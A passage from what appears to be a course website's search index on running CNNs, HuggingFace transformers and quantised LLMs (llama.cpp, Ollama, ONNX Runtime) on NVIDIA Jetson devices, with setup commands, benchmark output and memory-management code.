</ul>"},{"location":"curriculum/04_deeplearning_cnn/#data-preparation-and-augmentation","title":"Data Preparation and Augmentation","text":"<p>The Jetson CNN Toolkit includes comprehensive data handling capabilities:</p> <ul> <li>Dataset Support: CIFAR-10, ImageNet, and custom datasets</li> <li>Data Augmentation: Random horizontal flip, rotation, color jittering, and normalization</li> <li>Efficient Loading: Optimized data loaders with configurable batch sizes and worker processes</li> <li>Preprocessing Pipeline: Automatic image preprocessing with dataset-specific normalization values</li> </ul>"},{"location":"curriculum/04_deeplearning_cnn/#training-pipeline","title":"Training Pipeline","text":"<p>The Jetson CNN Toolkit provides a comprehensive training system:</p> <ul> <li>Optimizer Support: Adam, SGD, and other optimizers with configurable learning rates</li> <li>Loss Functions: Cross-entropy, focal loss, and custom loss implementations</li> <li>Learning Rate Scheduling: Step decay, cosine annealing, and adaptive scheduling</li> <li>Training Monitoring: Real-time loss and accuracy tracking with progress visualization</li> <li>Validation: Automatic validation during training with early stopping capabilities</li> <li>Device Management: Automatic GPU/CPU detection and memory optimization for Jetson devices</li> </ul>"},{"location":"curriculum/04_deeplearning_cnn/#visualization-and-monitoring","title":"Visualization and Monitoring","text":"<p>The toolkit includes comprehensive visualization capabilities:</p> <ul> <li>Training Curves: Real-time plotting of loss and accuracy metrics</li> <li>Performance Metrics: Detailed accuracy, precision, recall, and F1-score tracking</li> <li>Model Visualization: Architecture diagrams and feature map visualization</li> <li>Export Options: Save training history and model checkpoints automatically</li> </ul>"},{"location":"curriculum/04_deeplearning_cnn/#usage-example","title":"Usage Example","text":"<p>The Jetson CNN Toolkit provides a simple command-line interface for training:</p> <pre><code># Train a BasicCNN on CIFAR-10\npython jetson_cnn_toolkit.py --mode train --model BasicCNN --dataset cifar10 --epochs 20\n\n# Train with custom parameters\npython jetson_cnn_toolkit.py --mode train --model CustomResNet --dataset imagenet --batch-size 64 --lr 0.001\n</code></pre>"},{"location":"curriculum/05_transformers_nlp_applications/","title":"\ud83e\udd16 Transformers on Jetson","text":"<p>Author: Dr. Kaikai Liu, Ph.D. Position: Associate Professor, Computer Engineering Institution: San Jose State University Contact: kaikai.liu@sjsu.edu</p>"},{"location":"curriculum/05_transformers_nlp_applications/#what-are-transformers","title":"\ud83e\udde0 What Are Transformers?","text":"<p>Transformers are a type of deep learning model designed to handle sequential data, such as text, audio, or even images. Introduced in the 2017 paper \"Attention Is All You Need,\" transformers replaced recurrent neural networks in many NLP tasks.</p>"},{"location":"curriculum/05_transformers_nlp_applications/#key-components","title":"\ud83d\udd11 Key Components","text":"<ul> <li>Self-Attention: Each token attends to all other tokens in a sequence.</li> <li>Positional Encoding: Adds order information to input tokens.</li> <li>Multi-head Attention: Parallel attention mechanisms capture different relationships.</li> <li>Feedforward Layers: Apply transformations independently to each position.</li> </ul>"},{"location":"curriculum/05_transformers_nlp_applications/#popular-transformer-architectures","title":"\ud83d\udcda Popular Transformer Architectures","text":"Model Purpose Examples BERT Encoder (bi-directional) Question answering, embeddings GPT Decoder (uni-directional) Text generation T5 Encoder-Decoder Translation, summarization LLaMA/Qwen Open-source LLMs General language modeling"},{"location":"curriculum/05_transformers_nlp_applications/#huggingface-transformers-on-jetson","title":"\ud83e\udd17 HuggingFace Transformers on Jetson","text":"<p>While large LLMs require quantization, many HuggingFace models (BERT, DistilBERT, TinyGPT) can run on Jetson using PyTorch + Transformers with ONNX export or quantized alternatives.</p>"},{"location":"curriculum/05_transformers_nlp_applications/#basic-vs-accelerated-inference","title":"\ud83d\ude80 Basic vs Accelerated Inference","text":"Approach Speed Memory Complexity Best For Basic PyTorch Baseline High Low Development, prototyping ONNX Runtime 2-3x faster Medium Medium Production inference TensorRT 3-5x faster Low High Optimized deployment Quantization 2-4x faster 50% less Medium Resource-constrained"},{"location":"curriculum/05_transformers_nlp_applications/#what-is-nlp","title":"\u2728 What is NLP?","text":"<p>Natural Language Processing (NLP) is a subfield of AI that enables machines to read, understand, and generate human language.</p>"},{"location":"curriculum/05_transformers_nlp_applications/#common-nlp-tasks","title":"\ud83d\udcac Common NLP Tasks","text":"<ul> <li>Text Classification (e.g., sentiment analysis, spam detection)</li> <li>Named Entity Recognition (NER) (extracting entities like names, locations)</li> <li>Machine Translation (translating between languages)</li> <li>Question Answering (extracting answers from context)</li> <li>Text Summarization (generating concise summaries)</li> <li>Chatbots &amp; Conversational AI (interactive dialogue systems)</li> <li>Text Generation (creating human-like text)</li> <li>Information Extraction (structured data from unstructured text)</li> </ul>"},{"location":"curriculum/05_transformers_nlp_applications/#comprehensive-huggingface-examples-with-transformers_llm_demopy","title":"\ud83d\udd27 Comprehensive HuggingFace Examples with <code>transformers_llm_demo.py</code>","text":"<p>Instead of implementing individual examples, we've created a comprehensive demonstration script called <code>transformers_llm_demo.py</code> that showcases various NLP applications using HuggingFace transformers with optimization techniques specifically designed for Jetson devices.</p> <p>This script provides a modular, command-line driven interface for exploring different NLP tasks and acceleration methods. Let's explore the key features and optimization techniques implemented in this demo.</p>"},{"location":"curriculum/05_transformers_nlp_applications/#available-applications","title":"\ud83d\udccb Available Applications","text":"<p>The <code>transformers_llm_demo.py</code> script supports seven different NLP applications:</p> <ol> <li>Text Classification (Sentiment Analysis)</li> <li>Analyzes text sentiment using DistilBERT models</li> <li> <p>Provides both basic and ONNX-optimized implementations</p> </li> <li> <p>Text Generation (GPT-2)</p> </li> <li>Generates text continuations from prompts using GPT-2</li> <li> <p>Implements both basic and quantized+GPU accelerated versions</p> </li> <li> <p>Question Answering (BERT)</p> </li> <li>Extracts answers from context passages using BERT models</li> <li> <p>Offers basic pipeline and optimized JIT-compiled implementations</p> </li> <li> <p>Named Entity Recognition (NER)</p> </li> <li>Identifies entities (people, organizations, locations) in text</li> <li> <p>Provides both basic and batch-optimized implementations</p> </li> <li> <p>Batch Processing Demo</p> </li> <li>Demonstrates efficient processing of multiple texts</li> <li> <p>Automatically determines optimal batch sizes for your hardware</p> </li> <li> <p>Model Benchmarking</p> </li> <li>Measures performance metrics across multiple runs</li> <li> <p>Reports detailed statistics on inference time and resource usage</p> </li> <li> <p>Performance Comparison</p> </li> <li>Directly compares basic vs. optimized implementations</li> <li>Calculates speedup factors and memory efficiency gains</li> </ol>"},{"location":"curriculum/05_transformers_nlp_applications/#optimization-techniques","title":"\u26a1 Optimization Techniques","text":"<p>The demo implements several optimization techniques that are particularly valuable for edge devices like the Jetson:</p>"},{"location":"curriculum/05_transformers_nlp_applications/#1-onnx-runtime-and-tensorrt-acceleration","title":"1. ONNX Runtime and TensorRT Acceleration","text":"<p>What it does: Provides hardware-optimized inference using ONNX Runtime with GPU acceleration and TensorRT integration for maximum performance on Jetson devices.</p> <p>Implementation details: - Uses <code>onnxruntime</code> directly with CUDA execution provider for GPU acceleration - Integrates <code>tensorrt</code> for additional optimization on NVIDIA hardware - Automatically selects appropriate execution provider (CUDA, TensorRT, or CPU) - Handles fallback to basic implementation if acceleration libraries are unavailable</p> <p>What you need to add: - Install ONNX Runtime GPU: <code>pip install onnxruntime-gpu</code> - Install TensorRT: Follow NVIDIA's installation guide for your Jetson device - For optimal performance, ensure both libraries are properly configured for your hardware</p>"},{"location":"curriculum/05_transformers_nlp_applications/#2-8-bit-quantization","title":"2. 8-bit Quantization","text":"<p>What it does: Reduces model precision from 32-bit to 8-bit, decreasing memory usage and increasing inference speed.</p> <p>Implementation details: - Uses <code>BitsAndBytesConfig</code> for configuring quantization parameters - Enables FP32 CPU offloading for handling operations not supported in INT8 - Combines with FP16 (half-precision) for operations that benefit from it</p> <p>What you need to add: - Install bitsandbytes: <code>pip install bitsandbytes</code> - May require Jetson-specific compilation for optimal performance</p>"},{"location":"curriculum/05_transformers_nlp_applications/#3-jit-compilation","title":"3. JIT Compilation","text":"<p>What it does: Compiles model operations into optimized machine code at runtime.</p> <p>Implementation details: - Uses <code>torch.jit.script()</code> to compile models - Implements graceful fallback if compilation fails - Applied to question answering models for faster inference</p> <p>What you need to add: - No additional packages required (built into PyTorch) - Ensure you're using a recent PyTorch version with good JIT support</p>"},{"location":"curriculum/05_transformers_nlp_applications/#4-batch-processing","title":"4. Batch Processing","text":"<p>What it does: Processes multiple inputs simultaneously for higher throughput.</p> <p>Implementation details: - Custom <code>TextDataset</code> class for efficient batch handling - Dynamic batch size determination based on available memory - Particularly effective for NER and classification tasks</p> <p>What you need to add: - No additional packages required - Consider adjusting batch sizes based on your specific Jetson model</p>"},{"location":"curriculum/05_transformers_nlp_applications/#5-gpu-memory-optimization","title":"5. GPU Memory Optimization","text":"<p>What it does: Carefully manages GPU memory to prevent out-of-memory errors on memory-constrained devices.</p> <p>Implementation details: - Implements <code>find_optimal_batch_size()</code> to automatically determine the largest workable batch size - Uses <code>torch.cuda.empty_cache()</code> to free memory between operations - Monitors memory usage with the <code>performance_monitor()</code> context manager</p> <p>What you need to add: - Optional: Install GPUtil for enhanced GPU monitoring: <code>pip install gputil</code></p>"},{"location":"curriculum/05_transformers_nlp_applications/#6-kv-caching-for-text-generation","title":"6. KV Caching for Text Generation","text":"<p>What it does: Caches key-value pairs in transformer attention layers to avoid redundant computations during text generation.</p> <p>Implementation details: - Enables <code>use_cache=True</code> in the model generation parameters - Particularly effective for autoregressive generation tasks - Combined with quantization for maximum efficiency</p> <p>What you need to add: - No additional packages required (built into transformers library)</p>"},{"location":"curriculum/05_transformers_nlp_applications/#using-the-demo","title":"\ud83d\ude80 Using the Demo","text":"<p>The demo can be run from the command line with various options:</p> <pre><code># List available applications\npython transformers_llm_demo.py --list\n\n# Run text classification with optimization\npython transformers_llm_demo.py --app 1 --text \"Jetson is amazing for edge AI!\" --optimize\n\n# Run text generation with custom parameters\npython transformers_llm_demo.py --app 2 --prompt \"Edge AI computing with Jetson\" --max-length 100\n\n# Run question answering\npython transformers_llm_demo.py --app 3 --question \"How many CUDA cores?\" --context \"The Jetson has 1024 CUDA cores\"\n</code></pre> <p>The script provides detailed performance metrics for each run, including: - Inference time - Memory usage - CPU/GPU utilization - Temperature monitoring (when available)</p>"},{"location":"curriculum/05_transformers_nlp_applications/#performance-monitoring","title":"\ud83d\udcca Performance Monitoring","text":"<p>The demo includes a comprehensive performance monitoring system that tracks:</p> <ul> <li>Execution time for each operation</li> <li>GPU memory allocation and usage</li> <li>CPU utilization changes</li> <li>GPU load and temperature (when available)</li> </ul> <p>This monitoring helps identify bottlenecks and optimize your models for the specific constraints of Jetson devices.</p>"},{"location":"curriculum/06_llms_jetson/","title":"\ud83d\ude80 What Are LLMs?","text":"<p>Author: Dr. Kaikai Liu, Ph.D. Position: Associate Professor, Computer Engineering Institution: San Jose State University Contact: kaikai.liu@sjsu.edu</p> <p>LLMs (Large Language Models) are transformer-based models trained on vast datasets to understand and generate human-like text.</p>"},{"location":"curriculum/06_llms_jetson/#common-use-cases","title":"\ud83d\udcac Common Use Cases","text":"<ul> <li>Chatbots and virtual assistants</li> <li>Code generation</li> <li>Summarization</li> <li>Translation</li> </ul>"},{"location":"curriculum/06_llms_jetson/#running-llms-on-jetson","title":"\ud83d\udee0\ufe0f Running LLMs on Jetson","text":"<p>Running LLMs on Jetson Orin Nano requires careful consideration of memory constraints, compute capabilities, and inference optimization. This section explores various LLM backends, their theoretical foundations, and practical implementations.</p>"},{"location":"curriculum/06_llms_jetson/#llm-backend-comparison","title":"\ud83c\udfaf LLM Backend Comparison","text":"Backend Memory Efficiency Speed Ease of Use CUDA Support Best For llama.cpp \u2b50\u2b50\u2b50\u2b50\u2b50 \u2b50\u2b50\u2b50\u2b50 \u2b50\u2b50\u2b50 \u2705 Production inference Ollama \u2b50\u2b50\u2b50\u2b50 \u2b50\u2b50\u2b50\u2b50 \u2b50\u2b50\u2b50\u2b50\u2b50 \u2705 Quick deployment llama-cpp-python \u2b50\u2b50\u2b50\u2b50 \u2b50\u2b50\u2b50\u2b50 \u2b50\u2b50\u2b50\u2b50 \u2705 Python integration TensorRT-LLM \u2b50\u2b50\u2b50 \u2b50\u2b50\u2b50\u2b50\u2b50 \u2b50\u2b50 \u2705 Maximum performance ONNX Runtime \u2b50\u2b50\u2b50 \u2b50\u2b50\u2b50 \u2b50\u2b50\u2b50 \u2705 Cross-platform vLLM \u2b50\u2b50 \u2b50\u2b50\u2b50\u2b50\u2b50 \u2b50\u2b50\u2b50 \u2705 Batch inference"},{"location":"curriculum/06_llms_jetson/#theoretical-foundations","title":"\ud83e\udde0 Theoretical Foundations","text":""},{"location":"curriculum/06_llms_jetson/#quantization-theory","title":"Quantization Theory","text":"<p>Quantization reduces model precision from FP32/FP16 to lower bit representations:</p> <ul> <li>INT8 Quantization: 8-bit integers, ~4x memory reduction</li> <li>INT4 Quantization: 4-bit integers, ~8x memory reduction  </li> <li>GPTQ: Post-training quantization preserving model quality</li> <li>AWQ: Activation-aware weight quantization</li> </ul>"},{"location":"curriculum/06_llms_jetson/#memory-optimization-strategies","title":"Memory Optimization Strategies","text":"<ol> <li>KV-Cache Management: Efficient attention cache storage</li> <li>Paged Attention: Dynamic memory allocation for sequences</li> <li>Gradient Checkpointing: Trade compute for memory during training</li> <li>Model Sharding: Split large models across memory boundaries</li> </ol>"},{"location":"curriculum/06_llms_jetson/#inference-optimization","title":"Inference Optimization","text":"<ul> <li>Speculative Decoding: Use smaller model to predict tokens</li> <li>Continuous Batching: Dynamic batching for variable sequence lengths</li> <li>Flash Attention: Memory-efficient attention computation</li> <li>Kernel Fusion: Combine operations to reduce memory transfers</li> </ul>"},{"location":"curriculum/06_llms_jetson/#llm-backends-for-edge-devices","title":"\ud83d\udd27 LLM Backends for Edge Devices","text":""},{"location":"curriculum/06_llms_jetson/#1-llamacpp-high-performance-c-engine","title":"1. llama.cpp - High-Performance C++ Engine","text":"<p>Architecture: Pure C++ implementation with CUDA acceleration Memory Model: Efficient GGUF format with memory mapping Quantization: K-quants (Q4_K_M, Q6_K) for optimal quality/speed trade-off Device Availability: - \u2705 NVIDIA Jetson (CUDA-enabled) - \u2705 NVIDIA GPUs (CUDA) - \u2705 x86 CPUs - \u2705 Apple Silicon (Metal support via separate build)</p> <p>&lt;!-- Installation: <pre><code># Basic installation\ngit clone https://github.com/ggerganov/llama.cpp\ncd llama.cpp\n\n# For CUDA support (Jetson/NVIDIA GPUs)\nmake LLAMA_CUBLAS=1\n\n# For CPU-only\nmake\n``` --&gt;\nLocal models are already downloaded under the `models` directory in `/Developer/models`, when inside the container, the `/Developer/models` folder has been mounted to `/models`:\n```bash\n$ sjsujetsontool shell\n/models# ls\nhf  mistral.gguf  qwen.gguf\n#Download the model, if needed\n/models$ wget https://huggingface.co/TheBloke/Mistral-7B-Instruct-v0.2-GGUF/resolve/main/mistral-7b-instruct-v0.2.Q4_K_M.gguf -O mistral.gguf\n</code></pre></p> <p>llama.cpp requires the model to be stored in the GGUF file format. <code>llama-cli</code> is a CLI tool for accessing and experimenting with most of llama.cpp's functionality. Run in conversation mode: <code>llama-cli -m model.gguf</code> or add custom chat template: <code>llama-cli -m model.gguf -cnv --chat-template chatml</code></p> <p>Run a local downloaded model (<code>llama-cli</code> is already added in the path of the container): <pre><code>root@sjsujetson-00:/workspace# llama-cli -m /models/mistral.gguf -p \"Explain what is Nvidia jetson\"\n....\nllama_perf_sampler_print:    sampling time =      11.06 ms /   185 runs   (    0.06 ms per token, 16731.48 tokens per second)\nllama_perf_context_print:        load time =    1082.38 ms\nllama_perf_context_print: prompt eval time =    2198.32 ms /    17 tokens (  129.31 ms per token,     7.73 tokens per second)\nllama_perf_context_print:        eval time =   27024.20 ms /   167 runs   (  161.82 ms per token,     6.18 tokens per second)\nllama_perf_context_print:       total time =   70364.22 ms /   184 tokens\n</code></pre></p> <p><code>llama-server</code> is a lightweight, OpenAI API compatible, HTTP server for serving LLMs. Start a local HTTP server with default configuration on port 8080: <code>llama-server -m model.gguf --port 8080</code>, Basic web UI can be accessed via browser: <code>http://localhost:8080</code>. Chat completion endpoint: <code>http://localhost:8080/v1/chat/completions</code> <pre><code>root@sjsujetson-00:/workspace# llama-server -m models/mistral.gguf --port 8080\nggml_cuda_init: GGML_CUDA_FORCE_MMQ:    no\nggml_cuda_init: GGML_CUDA_FORCE_CUBLAS: no\nggml_cuda_init: found 1 CUDA devices:\n  Device 0: Orin, compute capability 8.7, VMM: yes\nbuild: 5752 (62af4642) with cc (Ubuntu 13.2.0-23ubuntu4) 13.2.0 for aarch64-linux-gnu\nsystem info: n_threads = 6, n_threads_batch = 6, total_threads = 6\n\nsystem_info: n_threads = 6 (n_threads_batch = 6) / 6 | CUDA : ARCHS = 870 | USE_GRAPHS = 1 | PEER_MAX_BATCH_SIZE = 128 | CPU : NEON = 1 | ARM_FMA = 1 | FP16_VA = 1 | DOTPROD = 1 | LLAMAFILE = 1 | OPENMP = 1 | REPACK = 1 | \n.....\n</code></pre></p> <p>Send request via curl in another terminal (in the host machine or container): <pre><code>sjsujetson@sjsujetson-01:~$ curl http://localhost:8080/completion -d '{\n  \"prompt\": \"Explain what is Nvidia jetson?\",\n  \"n_predict\": 100\n}'\n</code></pre></p> <p>By default, llama-server listens only on 127.0.0.1 (localhost), which blocks external access. To enable external access, you need to bind to 0.0.0.0 (This tells it to accept connections from any IP address.): <pre><code>llama-server -m ../models/mistral.gguf --port 8080 --host 0.0.0.0\n</code></pre> If your Jetson device has ufw (Uncomplicated Firewall) or iptables enabled, open port 8080: <pre><code>sudo ufw allow 8080/tcp\n</code></pre> <code>llama-server</code> command is also integrated with <code>sjsujetsontool</code>, you can quickly start llama server via: <pre><code>sjsujetsontool llama #it will launch llama server on port 8000\n</code></pre></p>"},{"location":"curriculum/06_llms_jetson/#llama-cpp-python","title":"llama cpp Python","text":"<p>llama-cpp-python is a Python library that provides bindings for llama.cpp. It provides  - Low-level access to C API via ctypes interface. - High-level Python API for text completion     - OpenAI-like API     - LangChain compatibility     - LlamaIndex compatibility - OpenAI compatible web server     - Local Copilot replacement     - Function Calling support     - Vision API support     - Multiple Models</p> <p>All llama.cpp cmake build options can be set via the CMAKE_ARGS environment variable or via the --config-settings / -C cli flag during installation. llama-cpp-python cuda backend is already build and installed inside our container.  <pre><code>root@sjsujetson-00:/workspace# python \nPython 3.12.3 (main, Nov  6 2024, 18:32:19) [GCC 13.2.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; from llama_cpp import Llama\n</code></pre></p> <p>Run the test llama cpp python code: <pre><code>root@sjsujetson-01:/Developer/edgeAI# python edgeLLM/llama_cpp_pythontest.py\n....\nAvailable chat formats from metadata: chat_template.default\nGuessed chat format: mistral-instruct\nllama_perf_context_print:        load time =    1874.08 ms\nllama_perf_context_print: prompt eval time =    1873.02 ms /    11 tokens (  170.27 ms per token,     5.87 tokens per second)\nllama_perf_context_print:        eval time =   25315.11 ms /   127 runs   (  199.33 ms per token,     5.02 tokens per second)\nllama_perf_context_print:       total time =   27284.54 ms /   138 tokens\n\ud83d\udd52 Inference time: 27.29 seconds\n\ud83d\udd22 Tokens generated: 128\n\u26a1 Tokens/sec: 4.69\n</code></pre></p> <p>Optimal Settings by Device (from unified_llm_demo.py): <pre><code># NVIDIA CUDA (Desktop GPUs)\nn_gpu_layers=35, n_threads=8, n_batch=512, n_ctx=2048\n\n# Jetson\nn_gpu_layers=20, n_threads=6, n_batch=256, n_ctx=2048\n\n# Apple Silicon\nn_gpu_layers=0, n_threads=8, n_batch=512, n_ctx=2048\n\n# CPU\nn_gpu_layers=0, n_threads=8, n_batch=256, n_ctx=2048\n</code></pre></p>"},{"location":"curriculum/06_llms_jetson/#2-ollama-simplified-llm-deployment","title":"2. Ollama - Simplified LLM Deployment","text":"<p>Architecture: Docker-based deployment with REST API Model Management: Automatic model downloading and caching Concurrency: Built-in request queuing and batching Device Availability: - \u2705 NVIDIA Jetson (with Docker) - \u2705 NVIDIA GPUs - \u2705 x86 CPUs - \u2705 Apple Silicon (native ARM build)</p> <p>&lt;!-- Installation: <pre><code># macOS and Linux\ncurl -fsSL https://ollama.ai/install.sh | sh\n\n# For Jetson, you may need to build from source\ngit clone https://github.com/ollama/ollama\ncd ollama\ngo build\n``` --&gt;\n\n**API Endpoint**: http://localhost:11434/api/generate\n\n#### **3. Transformers - HuggingFace Library**\n\n**Architecture**: Python-based with PyTorch/TensorFlow backend\n**Memory Management**: Model parallelism and offloading options\n**Optimization**: Supports quantization, caching, and JIT compilation\n**Device Availability**:\n- \u2705 NVIDIA Jetson (with limitations on model size)\n- \u2705 NVIDIA GPUs\n- \u2705 x86 CPUs\n- \u2705 Apple Silicon (via MPS backend)\n\n**Installation**:\n```bash\n# Basic installation\npip install transformers\n\n# With PyTorch for GPU support\npip install torch transformers\n\n# With quantization support\npip install transformers accelerate bitsandbytes\n</code></pre></p> <p>Optimal Settings by Device (from unified_llm_demo.py): <pre><code># NVIDIA CUDA (Desktop GPUs/Jetson)\ndevice_map=\"auto\", torch_dtype=torch.float16, load_in_8bit=True, use_cache=True\n\n# Apple Silicon\ndevice_map=\"mps\", use_cache=True\n\n# CPU\ndevice_map=\"cpu\", use_cache=True\n</code></pre></p>"},{"location":"curriculum/06_llms_jetson/#4-onnx-runtime-cross-platform-optimization","title":"4. ONNX Runtime - Cross-Platform Optimization","text":"<p>Architecture: Microsoft's cross-platform inference engine Optimization: Graph optimization, operator fusion, memory planning Providers: CUDA, TensorRT, CPU execution providers Device Availability: - \u2705 NVIDIA Jetson (via CUDA provider) - \u2705 NVIDIA GPUs (via CUDA/TensorRT providers) - \u2705 x86 CPUs (via CPU provider) - \u2705 Apple Silicon (via CPU provider)</p> <p>Installation: <pre><code># CPU-only version\npip install onnxruntime\n\n# GPU-accelerated version\npip install onnxruntime-gpu\n\n# For Jetson, you may need to build from source or use NVIDIA containers\n</code></pre></p> <p>Optimal Settings by Device (from unified_llm_demo.py): <pre><code># NVIDIA CUDA (Desktop GPUs/Jetson)\nprovider=\"CUDAExecutionProvider\", optimization_level=99\n\n# CPU or Apple Silicon\nprovider=\"CPUExecutionProvider\", optimization_level=99\n</code></pre></p>"},{"location":"curriculum/06_llms_jetson/#device-specific-optimizations","title":"\ud83d\udd04 Device-Specific Optimizations","text":"<p>The <code>unified_llm_demo.py</code> script includes a <code>DeviceManager</code> class that automatically detects the hardware platform and applies optimal settings for each backend. Here's how it works:</p>"},{"location":"curriculum/06_llms_jetson/#device-detection-logic","title":"Device Detection Logic:","text":"<pre><code>def _detect_device_type(self) -&gt; str:\n    # Check for NVIDIA GPU with CUDA\n    if torch.cuda.is_available():\n        # Check if it's a Jetson device\n        if os.path.exists(\"/etc/nv_tegra_release\") or \\\n           os.path.exists(\"/etc/nv_tegra_version\"):\n            return \"jetson\"\n        else:\n            return \"cuda\"\n\n    # Check for Apple Silicon\n    if platform.system() == \"Darwin\" and platform.machine() == \"arm64\":\n        return \"apple_silicon\"\n\n    # Default to CPU\n    return \"cpu\"\n</code></pre>"},{"location":"curriculum/06_llms_jetson/#available-optimizations-by-device","title":"Available Optimizations by Device:","text":"Optimization Jetson NVIDIA GPU Apple Silicon CPU ONNX \u2705 \u2705 \u2705 \u2705 Quantization \u2705 \u2705 \u274c \u274c MPS \u274c \u274c \u2705 \u274c CUDA \u2705 \u2705 \u274c \u274c Half Precision \u2705 \u2705 \u274c \u274c INT8 \u2705 \u2705 \u274c \u274c"},{"location":"curriculum/06_llms_jetson/#memory-optimization-techniques","title":"\ud83c\udfaf Memory Optimization Techniques","text":"<p>Running LLMs on edge devices requires careful memory management. The <code>unified_llm_demo.py</code> script implements several techniques:</p>"},{"location":"curriculum/06_llms_jetson/#1-memory-optimization-function","title":"1. Memory Optimization Function","text":"<pre><code>def optimize_memory():\n    # Clear Python garbage\n    gc.collect()\n\n    # Clear CUDA cache if using PyTorch\n    if torch.cuda.is_available():\n        torch.cuda.empty_cache()\n        torch.cuda.synchronize()\n\n    # Get memory info\n    memory = psutil.virtual_memory()\n    print(f\"Available RAM: {memory.available / (1024**3):.1f}GB\")\n\n    if torch.cuda.is_available():\n        # Print GPU memory statistics\n        gpu_memory = torch.cuda.get_device_properties(0).total_memory\n        gpu_allocated = torch.cuda.memory_allocated(0)\n        gpu_reserved = torch.cuda.memory_reserved(0)\n\n        print(f\"GPU Memory: {gpu_memory / (1024**3):.1f}GB total\")\n        print(f\"GPU Allocated: {gpu_allocated / (1024**3):.1f}GB\")\n        print(f\"GPU Reserved: {gpu_reserved / (1024**3):.1f}GB\")\n</code></pre>"},{"location":"curriculum/06_llms_jetson/#2-performance-monitoring","title":"2. Performance Monitoring","text":"<p>The script includes a <code>performance_monitor</code> context manager that tracks: - Execution time - Memory usage (RAM and GPU) - CPU usage - GPU utilization and temperature (when available)</p>"},{"location":"curriculum/06_llms_jetson/#benchmarking-capabilities","title":"\ud83d\udcca Benchmarking Capabilities","text":"<p>The <code>unified_llm_demo.py</code> script includes a comprehensive benchmarking system through the <code>BenchmarkManager</code> class:</p>"},{"location":"curriculum/06_llms_jetson/#1-single-backend-benchmarking","title":"1. Single Backend Benchmarking","text":"<p>The <code>run_benchmark</code> method tests a specific backend and model with multiple prompts and runs, collecting: - Inference times - Memory usage - Generated text quality</p>"},{"location":"curriculum/06_llms_jetson/#2-multi-backend-comparison","title":"2. Multi-Backend Comparison","text":"<p>The <code>compare_backends</code> method allows comparing different backends and models on the same prompts, with visualization capabilities:</p> <pre><code># Example usage\nbenchmark_manager.compare_backends(\n    prompts=sample_prompts,\n    backends_models=[(\"llama_cpp\", \"llama-2-7b-chat.q4_K_M.gguf\"), \n                    (\"ollama\", \"llama2:7b-chat\")],\n    num_runs=3,\n    max_tokens=50\n)\n</code></pre>"},{"location":"curriculum/06_llms_jetson/#3-visualization","title":"3. Visualization","text":"<p>The <code>create_comparison_visualization</code> method generates bar charts comparing: - Average inference time - Memory usage - Standard deviation</p>"},{"location":"curriculum/06_llms_jetson/#running-the-unified-llm-demo","title":"\ud83d\ude80 Running the Unified LLM Demo","text":"<p>The script provides a flexible command-line interface:</p> <pre><code># List available backends\npython unified_llm_demo.py --list\n\n# Run with llama.cpp backend\npython unified_llm_demo.py --backend llama_cpp \\\n    --model-path models/llama-2-7b-chat.q4_K_M.gguf \\\n    --prompt \"Explain edge AI\"\n\n# Run with Ollama backend\npython unified_llm_demo.py --backend ollama \\\n    --model-name llama2:7b-chat \\\n    --prompt \"Explain edge AI\"\n\n# Run benchmark comparison\npython unified_llm_demo.py --benchmark \\\n    --backends llama_cpp ollama \\\n    --model-names llama-2-7b-chat.q4_K_M.gguf llama2:7b-chat\n</code></pre>"},{"location":"curriculum/06_llms_jetson/#gguf-model-format","title":"\ud83d\udd04 GGUF Model Format","text":"<p>GGUF (GPT-Generated Unified Format) is the successor to GGML, designed for efficient LLM storage and inference:</p>"},{"location":"curriculum/06_llms_jetson/#format-advantages","title":"Format Advantages:","text":"<ul> <li>Memory Mapping: Direct file access without loading entire model into RAM</li> <li>Metadata Storage: Model configuration embedded in file</li> <li>Quantization Support: Multiple precision levels in single file</li> <li>Cross-Platform: Consistent format across architectures</li> </ul>"},{"location":"curriculum/06_llms_jetson/#quantization-levels-for-7b-parameter-models","title":"Quantization Levels for 7B Parameter Models:","text":"Format Size Quality Speed Best For FP16 13.5GB 100% Baseline Maximum quality Q8_0 7.2GB 99% 1.2x High quality, some speed Q6_K 5.4GB 97% 1.5x Good balance Q4_K_M 4.1GB 95% 2.0x Recommended for most use Q4_0 3.8GB 92% 2.2x Faster inference Q3_K_M 3.1GB 88% 2.5x Memory constrained Q2_K 2.4GB 80% 3.0x Maximum speed <p>For Jetson devices, the Q4_K_M format typically offers the best balance of quality, speed, and memory usage.</p>"},{"location":"curriculum/06_llms_jetson/#jetson-compatible-transformer-models","title":"\u26a1 Jetson-Compatible Transformer Models","text":"Model Size Format Notes Mistral 7B 4\u20138GB GGUF Fast and widely supported Qwen 1.5/3 7B/8B 5\u20139GB GGUF Open-source, multilingual LLaMA 2/3 7B 4\u20137GB GGUF General-purpose LLM DeepSeek 7B 4\u20138GB GGUF Math &amp; reasoning focus DistilBERT \\~250MB HF Lightweight, good for NLP tasks"},{"location":"curriculum/06_llms_jetson/#common-issues-and-solutions","title":"\u26a0\ufe0f Common Issues and Solutions","text":""},{"location":"curriculum/06_llms_jetson/#memory-issues","title":"Memory Issues","text":"<pre><code># Problem: CUDA out of memory\n# Solution: Implement memory management\n\nimport torch\nimport gc\n\ndef clear_memory():\n    \"\"\"Clear GPU memory and cache\"\"\"\n    if torch.cuda.is_available():\n        torch.cuda.empty_cache()\n        torch.cuda.synchronize()\n    gc.collect()\n    print(\"\ud83e\uddf9 Memory cleared\")\n\n# Use smaller batch sizes\nBATCH_SIZE = 4  # Instead of 16 or 32\n\n# Enable gradient checkpointing\nmodel.gradient_checkpointing_enable()\n\n# Use mixed precision\nfrom torch.cuda.amp import autocast\nwith autocast():\n    outputs = model(**inputs)\n</code></pre>"},{"location":"curriculum/06_llms_jetson/#model-loading-issues","title":"Model Loading Issues","text":"<pre><code># Problem: Model fails to load\n# Solution: Progressive fallback strategy\n\ndef load_model_with_fallback(model_name):\n    strategies = [\n        # Strategy 1: Full precision GPU\n        lambda: AutoModelForCausalLM.from_pretrained(\n            model_name, torch_dtype=torch.float32, device_map=\"auto\"\n        ),\n        # Strategy 2: Half precision GPU\n        lambda: AutoModelForCausalLM.from_pretrained(\n            model_name, torch_dtype=torch.float16, device_map=\"auto\"\n        ),\n        # Strategy 3: 8-bit quantization\n        lambda: AutoModelForCausalLM.from_pretrained(\n            model_name, load_in_8bit=True, device_map=\"auto\"\n        ),\n        # Strategy 4: CPU fallback\n        lambda: AutoModelForCausalLM.from_pretrained(\n            model_name, torch_dtype=torch.float32, device_map=\"cpu\"\n        )\n    ]\n\n    for i, strategy in enumerate(strategies):\n        try:\n            print(f\"\ud83d\udd04 